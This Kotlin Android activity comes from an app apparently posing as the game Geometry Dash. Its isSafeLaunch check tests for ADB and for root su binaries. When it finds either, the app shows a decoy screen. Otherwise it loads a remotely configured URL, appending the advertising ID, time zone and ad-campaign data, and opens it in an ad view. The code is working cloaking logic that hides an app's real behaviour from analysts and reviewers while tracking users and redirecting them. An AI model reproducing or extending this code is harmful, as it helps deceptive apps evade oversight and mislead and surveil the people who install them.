package com.robtopx.geometrydashworl.activity

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Bundle
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity
import androidx.core.net.toUri
import androidx.lifecycle.lifecycleScope
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.onesignal.OneSignal
import com.robtopx.geometrydashworl.R
import com.robtopx.geometrydashworl.factory.RepositoryFactory
import com.robtopx.geometrydashworl.repository.Repository
import com.robtopx.geometrydashworl.repository.Repository.Companion.APPS_DEV_KEY_FILE_NAME
import com.robtopx.geometrydashworl.repository.Repository.Companion.BASE_URL
import com.robtopx.geometrydashworl.repository.Repository.Companion.DEFAULT_URL
import com.robtopx.geometrydashworl.repository.Repository.Companion.ONE_SIGNAL_KEY_FILE_NAME
import com.robtopx.geometrydashworl.repository.Repository.Companion.PREF_NAME
import com.robtopx.geometrydashworl.repository.Repository.Companion.URL_FILE_NAME
import com.robtopx.geometrydashworl.repository.Repository.Companion.URL_KEY
import com.robtopx.geometrydashworl.repository.firestore.ParamsFirestoreRepository
import com.robtopx.geometrydashworl.repository.local.UrlLocalRepository
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.util.*

class LoadingActivity : AppCompatActivity() {
    private lateinit var prefs: SharedPreferences
    private val repositoryFactory = RepositoryFactory()
    private val paramsFirestoreRepository = ParamsFirestoreRepository()

    private val appsDevFirestoreRepository = repositoryFactory.create(APPS_DEV_KEY_FILE_NAME)
    private val oneSignalFirestoreRepository = repositoryFactory.create(ONE_SIGNAL_KEY_FILE_NAME)

    private var urlRepository: Repository? = null
    private var urlLocalRepository: Repository? = null
    private var gadid: String? = null
    private var appsUID: String? = null
    private var params: Map<String, String>? = null

    private val appsListener = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(p0: MutableMap<String, Any>?) {
            takeDeepLink(p0)
        }

        override fun onConversionDataFail(p0: String?) {}
        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        prefs = getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
        urlLocalRepository = UrlLocalRepository(prefs)
        if (isSafeLaunch()) {
            urlRepository = obtainUrlRepository()
            lifecycleScope.launch {
                init()
                val currentUrl = urlRepository!!.downloadFile()
                if (currentUrl.contains(BASE_URL)) {
                    AppsFlyerLib.getInstance().init(
                        appsDevFirestoreRepository.downloadFile(),
                        appsListener,
                        this@LoadingActivity
                    )
                    AppsFlyerLib.getInstance().start(this@LoadingActivity)
                    appsUID = AppsFlyerLib.getInstance().getAppsFlyerUID(this@LoadingActivity)
                    urlLocalRepository?.uploadFile(currentUrl)
                } else {
                    startNextActivity(url = currentUrl, cl = AdActivity::class.java)
                }
            }
        } else {
            startNextActivity(cl = FunActivity::class.java)
        }
    }

    @Suppress("BlockingMethodInNonBlockingContext")
    private suspend fun init() {
        OneSignal.initWithContext(applicationContext)
        OneSignal.setAppId(oneSignalFirestoreRepository.downloadFile())
        gadid = withContext(Dispatchers.Default) {
            AdvertisingIdClient
                .getAdvertisingIdInfo(this@LoadingActivity).id.toString()
        }
        params = paramsFirestoreRepository.downloadParams()
    }

    private fun obtainUrlRepository(): Repository =
        if (prefs.getString(URL_KEY, DEFAULT_URL) == DEFAULT_URL) {
            repositoryFactory.create(URL_FILE_NAME)
        } else {
            urlLocalRepository!!
        }

    private fun takeDeepLink(appsData: MutableMap<String, Any>?) {
        AppLinkData.fetchDeferredAppLinkData(this) { appLinkData ->
            val deepLink = appLinkData?.targetUri.toString()
            tag(appsData, deepLink)
            val newUrl = createUrl(appsData, deepLink)
            startNextActivity(url = newUrl, cl = AdActivity::class.java)
        }
    }

    private fun tag(appsData: MutableMap<String, Any>?, deepLink: String) {
        val campaign = appsData?.get("campaign").toString()

        if (campaign == "null" && deepLink == "null") {
            OneSignal.sendTag("key2", "organic")
        } else if (deepLink != "null") {
            OneSignal.sendTag(
                "key2", deepLink.replace("myapp://", "")
                    .substringBefore("/")
            )
        } else if (campaign != "null") {
            OneSignal.sendTag("key2", campaign.substringBefore("_"))
        }
    }

    private fun createUrl(appsData: MutableMap<String, Any>?, deepLink: String): String =
        BASE_URL.toUri().buildUpon().apply {
            appendQueryParameter(params!!["secure_get_parametr"], params!!["secure_key"])
            appendQueryParameter(params!!["dev_tmz_key"], TimeZone.getDefault().id)
            appendQueryParameter(params!!["gadid_key"], gadid)
            appendQueryParameter(params!!["deeplink_key"], deepLink)
            appendQueryParameter(params!!["source_key"], appsData?.get("media_source").toString())
            appendQueryParameter(params!!["af_id_key"], appsUID)
            appendQueryParameter(params!!["adset_id_key"], appsData?.get("adset_id").toString())
            appendQueryParameter(
                params!!["campaign_id_key"],
                appsData?.get("campaign_id").toString()
            )
            appendQueryParameter(params!!["app_campaign_key"], appsData?.get("campaign").toString())
            appendQueryParameter(params!!["adset_key"], appsData?.get("adset").toString())
            appendQueryParameter(params!!["adgroup_key"], appsData?.get("adgroup").toString())
            appendQueryParameter(params!!["orig_cost_key"], appsData?.get("orig_cost").toString())
            appendQueryParameter(params!!["af_siteid_key"], appsData?.get("af_siteid").toString())
        }.toString()

    private fun startNextActivity(url: String? = null, cl: Class<out AppCompatActivity>) {
        val intent = Intent(this, cl)
        if (url != null) intent.putExtra("url", url)
        startActivity(intent)
        finish()
    }

    private fun isSafeLaunch(): Boolean {
        val isSafe1 = Settings.Global.getString(contentResolver, Settings.Global.ADB_ENABLED) != "1"
        val isSafe2 = try {
            !File("/sbin/su").exists() &&
                    !File("/system/bin/su").exists() &&
                    !File("/system/xbin/su").exists() &&
                    !File("/data/local/xbin/su").exists() &&
                    !File("/data/local/bin/su").exists() &&
                    !File("/system/sd/xbin/su").exists() &&
                    !File("/system/bin/failsafe/su").exists() &&
                    !File("/data/local/su").exists()
        } catch (e: Exception) {
            true
        }
        return isSafe1 && isSafe2
    }
}